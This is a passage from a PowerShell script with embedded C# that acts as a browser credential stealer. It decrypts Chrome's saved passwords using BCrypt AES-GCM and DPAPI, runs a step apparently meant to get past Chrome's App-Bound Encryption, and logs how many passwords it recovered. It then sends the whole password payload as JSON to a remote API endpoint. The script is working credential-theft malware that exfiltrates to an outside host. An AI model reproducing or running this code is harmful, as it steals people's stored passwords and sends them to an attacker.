            if (status != 0) throw new InvalidOperationException("BCryptSetProperty failed: " + status);

            status = BCryptGenerateSymmetricKey(hAlgorithm, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
            if (status != 0) throw new InvalidOperationException("BCryptGenerateSymmetricKey failed: " + status);

            noncePtr = Marshal.AllocHGlobal(nonce.Length);
            Marshal.Copy(nonce, 0, noncePtr, nonce.Length);
            tagPtr = Marshal.AllocHGlobal(tag.Length);
            Marshal.Copy(tag, 0, tagPtr, tag.Length);

            var authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
            authInfo.cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
            authInfo.dwInfoVersion = 1;
            authInfo.pbNonce = noncePtr;
            authInfo.cbNonce = nonce.Length;
            authInfo.pbTag = tagPtr;
            authInfo.cbTag = tag.Length;

            byte[] plaintext = new byte[ciphertext.Length];
            int bytesWritten;
            status = BCryptDecrypt(hKey, ciphertext, ciphertext.Length, ref authInfo, null, 0, plaintext, plaintext.Length, out bytesWritten, 0);
            if (status != 0) throw new InvalidOperationException("BCryptDecrypt failed: " + status);

            if (bytesWritten != plaintext.Length)
            {
                Array.Resize(ref plaintext, bytesWritten);
            }

            return plaintext;
        }
        finally
        {
            if (noncePtr != IntPtr.Zero) Marshal.FreeHGlobal(noncePtr);
            if (tagPtr != IntPtr.Zero) Marshal.FreeHGlobal(tagPtr);
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlgorithm != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        }
    }
}
"@
$typeDefinition = $typeDefinition.Replace("__EXPORTER_CLASS__", $ChromeExporterClassName)
$typeDefinition = $typeDefinition.Replace("__COM_ELEVATOR_CLASS__", $ChromeComElevatorClassName)
$typeDefinition = $typeDefinition.Replace("__CRYPTO_CLASS__", $ChromeCryptoClassName)

Add-Type -ReferencedAssemblies System.Security -TypeDefinition $typeDefinition

Write-Host "[DEBUG] Building payload in memory (attemptDpapiDecrypt=$UseDpapiDecrypt)..."
$exporterType = [AppDomain]::CurrentDomain.GetAssemblies() |
    ForEach-Object { $_.GetType($ChromeExporterClassName) } |
    Where-Object { $_ } |
    Select-Object -First 1
$payloadJson = $exporterType.GetMethod("Export").Invoke($null, @($UseDpapiDecrypt))
$payloadObject = $payloadJson | ConvertFrom-Json
$payloadObject | Add-Member -NotePropertyName chrome -NotePropertyValue ([pscustomobject]$ChromeInfo) -Force
Write-Host "[DEBUG] passwordCount=$($payloadObject.passwordCount)"
$dpapiDecrypted = @($payloadObject.passwords | Where-Object { $_.password -and $_.password -ne "" -and $_.password -notmatch "App-Bound Encryption" }).Count
Write-Host "[DEBUG] v10_v11.decryptedCount=$dpapiDecrypted"

$chromelevatorMeta = Invoke-ChromelevatorExtraction -Payload $payloadObject -ApiBase $ApiBase
$payloadObject | Add-Member -NotePropertyName chromelevator -NotePropertyValue ([pscustomobject]$chromelevatorMeta) -Force
$abeDecrypted = @($payloadObject.passwords | Where-Object { $_.password_dpapi -and $_.password_dpapi -ne "" }).Count
Write-Host "[DEBUG] password_dpapi.decryptedCount=$abeDecrypted"

$payloadJson = $payloadObject | ConvertTo-Json -Depth 10

Write-Host "[DEBUG] Sending payload to API..."
$response = Invoke-RestMethod -Uri $PayloadUrl -Method Post -ContentType "application/json; charset=utf-8" -Body $payloadJson
$response | ConvertTo-Json -Compress
